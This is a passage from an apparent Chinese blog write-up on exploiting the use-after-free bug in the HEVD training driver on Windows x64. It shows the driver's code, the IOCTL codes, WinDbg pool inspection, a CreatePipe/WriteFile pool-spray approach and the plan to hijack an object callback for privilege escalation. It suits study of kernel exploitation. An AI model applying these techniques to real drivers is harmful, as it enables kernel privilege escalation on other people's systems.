(EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = <span class="built_in">GetExceptionCode</span>();</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就可以UAF调用callback函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">UseUaFObjectNonPagedPool</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    VOID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (g_UseAfterFreeObjectNonPagedPool)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Using UaF Object\n&quot;</span>);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] g_UseAfterFreeObjectNonPagedPool-&gt;Callback: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool-&gt;Callback);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Calling Callback\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (g_UseAfterFreeObjectNonPagedPool-&gt;Callback)</span><br><span class="line">            &#123;</span><br><span class="line">                g_UseAfterFreeObjectNonPagedPool-&gt;<span class="built_in">Callback</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Status = STATUS_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = <span class="built_in">GetExceptionCode</span>();</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>两个版本，一个是 <code>Nx</code> 版本，也就是不能写shellcode。</p>
<p>g_UseAfterFreeObjectNonPagedPool 初始化</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">AllocateUaFObjectNonPagedPool</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    VOID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line">    PUSE_AFTER_FREE_NON_PAGED_POOL UseAfterFree = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PAGED_CODE</span>();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Allocating UaF Object\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Allocate Pool chunk</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        UseAfterFree = (PUSE_AFTER_FREE_NON_PAGED_POOL)<span class="built_in">ExAllocatePoolWithTag</span>(</span><br><span class="line">            NonPagedPool,</span><br><span class="line">            <span class="built_in">sizeof</span>(USE_AFTER_FREE_NON_PAGED_POOL),</span><br><span class="line">            (ULONG)POOL_TAG</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!UseAfterFree)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Unable to allocate Pool chunk</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Unable to allocate Pool chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Status = STATUS_NO_MEMORY;</span><br><span class="line">            <span class="keyword">return</span> Status;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="built_in">STRINGIFY</span>(POOL_TAG));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Type: %s\n&quot;</span>, <span class="built_in">STRINGIFY</span>(NonPagedPool));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Size: 0x%zX\n&quot;</span>, <span class="built_in">sizeof</span>(USE_AFTER_FREE_NON_PAGED_POOL));</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, UseAfterFree);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Fill the buffer with ASCII &#x27;A&#x27;</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">RtlFillMemory</span>((PVOID)UseAfterFree-&gt;Buffer, <span class="built_in">sizeof</span>(UseAfterFree-&gt;Buffer), <span class="number">0x41</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Null terminate the char buffer</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        UseAfterFree-&gt;Buffer[<span class="built_in">sizeof</span>(UseAfterFree-&gt;Buffer) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Set the object Callback function</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        UseAfterFree-&gt;Callback = &amp;UaFObjectCallbackNonPagedPool;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Assign the address of UseAfterFree to a global variable</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        g_UseAfterFreeObjectNonPagedPool = UseAfterFree;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] UseAfterFree Object: 0x%p\n&quot;</span>, UseAfterFree);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n&quot;</span>, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[+] UseAfterFree-&gt;Callback: 0x%p\n&quot;</span>, UseAfterFree-&gt;Callback);</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = <span class="built_in">GetExceptionCode</span>();</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>UAF结构体</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_USE_AFTER_FREE_NON_PAGED_POOL</span></span><br><span class="line">&#123;</span><br><span class="line">    FunctionPointer Callback;</span><br><span class="line">    CHAR Buffer[<span class="number">0x54</span>];</span><br><span class="line">&#125; USE_AFTER_FREE_NON_PAGED_POOL, *PUSE_AFTER_FREE_NON_PAGED_POOL;</span><br></pre></td></tr></table></figure>

<p>寻找IOCTL：IDA 打开，交叉引用</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222013</span>:</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">	FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">AllocateUaFObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">	v7 = <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> LABEL_64;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x222017</span>:</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">	FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">UseUaFObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">	v7 = <span class="string">&quot;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> LABEL_64;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x22201B</span>:</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">	FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">FreeUaFObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">	v7 = <span class="string">&quot;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>思路：UAF劫持callback函数，让其执行提权的代码。</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>加载驱动，查看是否加载成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; lm m H*</span><br></pre></td></tr></table></figure>

<p>打断点和显示DbgPrint信息</p>
<ul>
<li><code>DebugBreak()</code> 应用程序触发kenel debug断点</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; ed nt!Kd_DEFAULT_MASK 0xFFFFFFFF</span><br></pre></td></tr></table></figure>

<p>因为存在 <code>Tag</code> 可以寻找pool，比较花时间，可以在DebugView里寻找信息.<code>!poolfind</code> 命令不会计算头部，<code>!pool</code> 会计算</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; !poolused 2 Hack</span><br><span class="line">0: kd&gt; !poolfind Hack -nonpaged</span><br><span class="line">3: kd&gt; g</span><br><span class="line">***** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******</span><br><span class="line">[+] Allocating UaF Object</span><br><span class="line">[+] Pool Tag: &#x27;kcaH&#x27;</span><br><span class="line">[+] Pool Type: NonPagedPool</span><br><span class="line">[+] Pool Size: 0x60</span><br><span class="line">[+] Pool Chunk: 0xFFFFA78BEF702B50</span><br><span class="line">[+] UseAfterFree Object: 0xFFFFA78BEF702B50</span><br><span class="line">[+] g_UseAfterFreeObjectNonPagedPool: 0xFFFFA78BEF702B50</span><br><span class="line">[+] UseAfterFree-&gt;Callback: 0xFFFFF8012D287CD0</span><br><span class="line">****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******</span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">0033:00007ff9`b21bb6d2 cc              int     3</span><br><span class="line">1: kd&gt; !pool 0xFFFFA78BEF702B50</span><br><span class="line">Pool page ffffa78bef702b50 region is Nonpaged pool</span><br><span class="line"> ffffa78bef702000 size:   30 previous size:    0  (Free)       ....</span><br><span class="line"> ffffa78bef702040 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef7020e0 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef702180 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef702220 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef7022c0 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef702360 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef702400 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef7024a0 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef702540 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef7025e0 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef702680 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef702720 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef7027c0 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef702860 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef702900 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef7029a0 size:   90 previous size:    0  (Allocated)  FSim</span><br></pre></td></tr></table></figure>

<p>查看内存信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dq 0xFFFFA78BEF702B50</span><br><span class="line">ffffa78b`ef702b50  fffff801`2d287cd0 41414141`41414141</span><br><span class="line">ffffa78b`ef702b60  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702b70  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702b80  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702b90  41414141`41414141 41414141`41414141</span><br><span class="line">ffffa78b`ef702ba0  41414141`41414141 00000000`00414141</span><br><span class="line">ffffa78b`ef702bb0  fe8fc5c0`d7167489 00000000`00000000</span><br><span class="line">ffffa78b`ef702bc0  00000000`00000000 ffffa78b`ef714039</span><br></pre></td></tr></table></figure>


<p>pool 实际大小，需要加入一个头部信息，可以从下面看出来，是一个 <code>_LIST_ENTRY</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> ffffa78bef702900 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"> ffffa78bef7029a0 size:   90 previous size:    0  (Allocated)  FSim</span><br><span class="line"></span><br><span class="line">1: kd&gt; !poolused 2 Hack</span><br><span class="line">Using a machine size of 1ffe7e pages to configure the kd cache</span><br><span class="line">....</span><br><span class="line"> Sorting by NonPaged Pool Consumed</span><br><span class="line">               NonPaged                  Paged</span><br><span class="line"> Tag     Allocs         Used     Allocs         Used</span><br><span class="line"> Hack         1          112          0            0	UNKNOWN pooltag &#x27;Hack&#x27;, please update pooltag.txt</span><br><span class="line">TOTAL         1          112          0            0</span><br></pre></td></tr></table></figure>

<p>因此实际获得的大小：0x70，内存对齐</p>
<p>内核池喷射是一项使池中分配位置可预测的艺术。这意味着你可以知道一个块将被分配到哪里，哪些块在其附近。</p>
<ul>
<li>微软有一个<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/sysinfo/kernel-objects">内核对象 - Win32 apps</a>列表，我们可以通过调用用户模式功能来创建内核对象，</li>
</ul>
<p>触发UAF前，需要使用 heap fengshui</p>
<ul>
<li>可以不布局，看来几篇文章，直接利用 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36918532/article/details/123417458">(3)</a></li>
<li><code>NtAllocateReserveObject</code> 布局，但是在x64下得到错误的</li>
<li>x64下可以使用<code>CreatePipe</code>和<code>WriteFile</code>来进行NonPagedPool喷射，缓冲区大小：PoolSize-HeaderSize(0x48)，NpFr tag。<a target="_blank" rel="noopener" href="https://securityinsecurity.github.io/exploiting-hevd-use-after-free/">(4)</a>[(5)](<a target="_blank" rel="noopener" href="https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/">Windows Kernel Exploitation – HEVD x64 Use-After-Free • Vulndev</a>)</li>
</ul>
<p>free后被合并，因此提高成功率，就创建碎片</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*ffffa78bef702a30 size:  5b0 previous size:    0  (Free)      *...~</span><br></pre></td></tr></table></figure>

<p>参考<a target="_blank" rel="noopener" href="https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/">(6)</a>，获得两个句柄 <code>0xac, 0xb0</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; !poolused 2 NpFr</span><br><span class="line">Using a machine size of 1ffe7e pages to configure the kd cache</span><br><span class="line">...</span><br><span class="line"> Sorting by NonPaged Pool Consumed</span><br><span class="line">               NonPaged                  Paged</span><br><span class="line"> Tag     Allocs         Used     Allocs         Used</span><br><span class="line"></span><br><span class="line"> NpFr         1          112          0            0	DATA_ENTRY records (read/write buffers) , Binary: npfs.sys</span><br><span class="line"></span><br><span class="line">TOTAL         1          112          0            0</span><br></pre></td></tr></table></figure>

<p>写入UAF，存在一个FAKE_OBJECT，可以进行写入</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x22201F</span>:</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n&quot;</span>);</span><br><span class="line">	FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">AllocateFakeObjectNonPagedPoolIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">	v7 = <span class="string">&quot;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> LABEL_64;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">AllocateFakeObjectNonPagedPoolIoctlHandler</span><span class="params">(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _NAMED_PIPE_CREATE_PARAMETERS *Parameters; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  Parameters = IrpSp-&gt;Parameters.CreatePipe.Parameters;</span><br><span class="line">  result = <span class="number">0xC0000001</span>;</span><br><span class="line">  <span class="keyword">if</span> ( Parameters )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">AllocateFakeObjectNonPagedPool</span>((_FAKE_OBJECT_NON_PAGED_POOL *)Parameters);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">AllocateFakeObjectNonPagedPool</span><span class="params">(_FAKE_OBJECT_NON_PAGED_POOL *UserFakeObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _OWORD *PoolWithTag; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Creating Fake Object\n&quot;</span>);</span><br><span class="line">  PoolWithTag = <span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPool, <span class="number">0x5C</span>ui64, <span class="number">0x6B636148</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( PoolWithTag )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="string">&quot;&#x27;kcaH&#x27;&quot;</span>);</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Type: %s\n&quot;</span>, <span class="string">&quot;NonPagedPool&quot;</span>);</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Size: 0x%zX\n&quot;</span>, <span class="number">0x5C</span>ui64);</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, PoolWithTag);</span><br><span class="line">    <span class="built_in">ProbeForRead</span>(UserFakeObject, <span class="number">0x5C</span>ui64, <span class="number">1u</span>);</span><br><span class="line">    *PoolWithTag = *(_OWORD *)UserFakeObject-&gt;Buffer;</span><br><span class="line">    PoolWithTag[<span class="number">1</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">16</span>];</span><br><span class="line">    PoolWithTag[<span class="number">2</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">32</span>];</span><br><span class="line">    PoolWithTag[<span class="number">3</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">48</span>];</span><br><span class="line">    PoolWithTag[<span class="number">4</span>] = *(_OWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">64</span>];</span><br><span class="line">    *((_QWORD *)PoolWithTag + <span class="number">10</span>) = *(_QWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">80</span>];</span><br><span class="line">    *((_DWORD *)PoolWithTag + <span class="number">22</span>) = *(_DWORD *)&amp;UserFakeObject-&gt;Buffer[<span class="number">88</span>];</span><br><span class="line">    *((_BYTE *)PoolWithTag + <span class="number">91</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Fake Object: 0x%p\n&quot;</span>, PoolWithTag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[-] Unable to allocate Pool chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3221225495</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打两个断点，成功写入</p>
